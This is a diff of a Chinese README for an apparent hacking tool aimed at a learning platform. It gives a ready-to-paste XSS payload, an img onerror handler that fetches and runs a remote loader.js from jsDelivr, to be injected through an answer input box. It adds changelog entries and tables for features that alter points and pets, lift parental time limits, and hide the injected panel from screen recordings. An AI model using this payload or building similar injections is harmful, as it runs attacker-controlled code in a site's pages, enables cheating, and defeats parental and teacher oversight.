@@ -7,7 +7,7 @@
 贴进「注释填空」的输入框，随便答错提交：
 
 ```html
-<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.4/loader.js'">
+<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.5/loader.js'">
 ```
 
 154 字符，输入框没有长度限制，直接粘贴即可。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
@@ -28,12 +28,20 @@
 >
 > `cdn.jsdelivr.net` 在国内常被重置，所以注入串默认用 `fastly.jsdelivr.net`；loader 自身与模块加载会按 `cdn` → `fastly` → `gcore` → raw.githubusercontent → GitLab API 依次重试。
 
+## v3.5
+
+- AI 图片输入改为**多图**：一次可选 / 拍最多 9 张，逐张压缩、逐张显示状态（处理中 / 上传中 / 已传 / 重试 / 仅发送），可单张重试或移除；发送时全部作为 `image_url`（Responses 模式自动转 `input_image`）随消息提交。
+- 新增**图片缩放**：点聊天里的图片、附件缩略图或相册图片会打开全屏缩放层——滚轮 / 双指缩放（40%–800%）、拖动平移、双击在 1× 与 2.5× 间切换、`－ / 1:1 / 适合 / ＋` 按钮，Esc 或 ✕ 关闭；相册查看窗也多了一个「缩放」按钮。
+- **配置 PIN 不再反复弹窗**：上传配置时自动生成 PIN（形如 `FH7k2m-9xq4-p3wd`）并保存在本机 `fh:cfg:pin`，成功后只展示一次可复制的恢复 PIN；本机有 PIN 时「⬇ 更新配置」直接静默恢复，不再要求输入。只有换设备 / 清缓存后才需要手输 PIN（提示里给出格式），登录页也会显示当前恢复 PIN。每次上传都会用新盐重写整份配置，旧 PIN 随之失效，避免「旧 PIN 解不开」的困惑。
+- **聊天室移到主面板 chat 下**：工具 → chat 组里新增「💬 聊天室（共享）」，点一下直接打开聊天室（AI 网页窗口头栏不再放聊天室按钮）；未登录时只读并提示先登录，未配置 Token 时提示先保存。
+- 版本号 `TAG` / AI 头栏 / 主面板标签统一升到 3.5。
+
 ## v3.4
 
 - 新增 👤 账号（用户名 + PIN）：聊天室、上传 / 更新配置、网页配置这些需要身份的功能，先登录账号再使用。
   - 第一次输入的用户名会自动注册；PIN 4-30 位。登录状态存在本机 `fh:acct`，刷新 / 重开页面都不用再输，直到手动「退出登录」或清空缓存。
   - 用户名 + PIN 每 5 秒只能提交一次，失败后按钮会倒计时提示。
-  - AI Key、上传 Token、网页常用站点（`fh:sites`）都归到当前账号：登录时载入、保存时同步回账号、退出后从本机清掉。换设备可用 ⬇ 更新配置（PIN）恢复其余配置。
+  - AI Key、上传 Token、网页常用站点（`fh:sites`）都归到当前账号：登录时载入、保存时同步回账号、退出后从本机清掉。换设备可用 ⬇ 更新配置（自动用本机 PIN，换设备时手输）恢复其余配置。
   - 聊天室发送、⬆ 上传配置 / ⬇ 更新配置要求已登录且本机有 GitLab Token；没有 Token 时提示先去 🔑 保存，聊天室只读、发送置灰。
   - 旧版按 API Key / Token 哈希隔离的会话与相册，在首次登录时会自动迁到账号名下。
   - 账号记录与 PIN 哈希只存本机 `fh:acct`，不会随配置上传。
@@ -83,10 +91,11 @@
 
 | 按钮 | 文件 | 作用 |
 |---|---|---|
-| 🤖 AI 网页 | `mods/ai.js` | 全屏、密钥掩码、网页相机拍照/相册、多会话、Chat/Responses、模型扫描、共享聊天室、探测缓存 |
+| 🤖 AI 网页 | `mods/ai.js` | 全屏、密钥掩码、网页相机拍照 / 相册、多会话、Chat/Responses、模型扫描、探测缓存；多图输入（≤9 张）+ 图片缩放 |
+| 💬 聊天室（共享） | `mods/ai.js` | 主面板 chat 组入口，直接开聊天室；消息写 GitLab `message/`，30 秒轮询 + 本机缓存 |
 | 👤 账号 | `loader.js` | 用户名 + PIN 登录（本机持久）；AI Key / Token / 网页配置按账号保存 |
-| ⬆ 上传配置 | `loader.js` | 本机 `fh:*` 配置加密上传到 `config/<id>.json`（除 API Key / 会话 / 缓存） |
-| ⬇ 更新配置 | `loader.js` | 输入 PIN 从云端解密取回配置，换设备/清缓存后一键恢复 |
+| ⬆ 上传配置 | `loader.js` | 本机 `fh:*` 配置加密上传到 `config/<id>.json`（除 API Key / 会话 / 缓存）；PIN 自动生成并保存在本机 |
+| ⬇ 更新配置 | `loader.js` | 本机有 PIN 时静默恢复，换设备才输入 PIN，从云端解密取回配置 |
 | ◐ 透明度 | `loader.js` | 主面板与模块窗口 5%–100%，标题栏保持可操作 |
 | 💰 积分 | `mods/score.js` | 设 `score` + `earned`（两个一起改才生效） |
 | 🐾 灵宠 | `mods/pets.js` | 数量（≤4）、种类（fox/qilin/cat/dog）、名字 |
@@ -119,8 +128,9 @@
 
 - `DK` 是每份配置随机的 256 位密钥；PIN / Token / 管理员密钥只用来包裹 `DK`，都不落盘。
 - 配置 ID 与 PIN 无关：重置 PIN 不改文件名，旧 PIN 立即失效。
-- `box.keys` 只收 `fh:*`（主题、透明度、网页站点、便签、解除限时标记、AI 地址/模型/思考深度等）；排除 API Key、会话、聊天记录、聊天室缓存、指令历史、`fh:mod:*` 源码缓存、`fh:cfg:*` 自身。
-- 恢复流程：`pullConfig` → 列出 `config/` → 逐个试解 `wrapPin` → 命中即解 `box` → 写回 localStorage（含 `fh:ai:gitToken`）。
+- `box.keys` 只收 `fh:*`（主题、透明度、网页站点、便签、解除限时标记、AI 地址/模型/思考深度等）；排除 API Key、会话、聊天记录、聊天室缓存、指令历史、`fh:mod:*` 源码缓存、`fh:cfg:*` 自身（含本机 PIN `fh:cfg:pin` / `fh:cfg:pinAt`）。
+- v3.5 起 PIN 由插件生成并保存在本机：上传时若有 Token 就直接用本地 PIN 重写配置，成功页展示一次可复制的 PIN；恢复时先试本机 PIN，失败才弹输入框（换设备 / 清缓存）。每次上传都会换新盐和新的 `wrapPin`，旧 PIN 立即失效。
+- 恢复流程：`pullConfig` → 有本机 PIN 直接 `cfgPull(pin)`，否则输入 PIN → 列出 `config/` → 逐个试解 `wrapPin` → 命中即解 `box` → 写回 localStorage（含 `fh:ai:gitToken`）并 `cfgPinSet(pin)`。
 
 ## 存档结构
 
@@ -135,7 +145,7 @@
 }
 ```
 
-`localStorage` 键：`wycg_v3`（学习数据）、`wycg_rank_v1`（排行榜）、`wycg_lock_v1`（家长密码）、`fh:lockfree`（本机解除限时标记）；插件自身配置 `fh:*`（主题、主面板透明度、`fh:sites`、`fh:note`、AI 地址/模型/思考深度/Token 等），其中 `fh:ai:key` 永不上传，`fh:cfg:id` / `fh:cfg:at` / `fh:cfg:admKey` 记录本机云端配置状态；`fh:acct` 存账号（用户名 / PIN 哈希 / 账号的 Key、Token、网页配置），同样不上传。
+`localStorage` 键：`wycg_v3`（学习数据）、`wycg_rank_v1`（排行榜）、`wycg_lock_v1`（家长密码）、`fh:lockfree`（本机解除限时标记）；插件自身配置 `fh:*`（主题、主面板透明度、`fh:sites`、`fh:note`、AI 地址/模型/思考深度/Token 等），其中 `fh:ai:key` 永不上传，`fh:cfg:id` / `fh:cfg:at` / `fh:cfg:admKey` 记录本机云端配置状态，`fh:cfg:pin` / `fh:cfg:pinAt` 是本机保存的恢复 PIN（不上传、不再反复询问）；`fh:ai:roomOpen` 只是「从主面板打开聊天室」的一次性开关；`fh:acct` 存账号（用户名 / PIN 哈希 / 账号的 Key、Token、网页配置），同样不上传。
 
 ## 注意
 
